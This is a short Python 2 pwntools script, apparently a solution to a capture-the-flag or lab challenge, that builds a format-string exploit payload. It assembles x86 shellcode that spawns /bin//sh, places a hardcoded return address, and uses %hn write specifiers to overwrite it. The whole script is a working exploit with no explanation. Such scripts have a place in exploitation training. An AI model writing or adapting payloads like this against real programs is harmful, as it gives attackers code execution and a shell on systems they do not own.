#! /usr/bin/env python

from pwn import *

RET_ADDR = 0xffffd79c

SHELL_ASM = """
xor ecx, ecx;
push ecx;
push 0x%s;
push 0x%s;
mov al, 0xb;
mov ebx, esp;
int 0x80;
""" % ( "//sh"[::-1].encode('hex'), "/bin"[::-1].encode('hex') )



PAYLOAD = '\xeb\x22NK' + p32(RET_ADDR) + 'AAAA' + p32(RET_ADDR+2) + '%54976x%hn%10543x%hn' + asm(SHELL_ASM)

print PAYLOAD
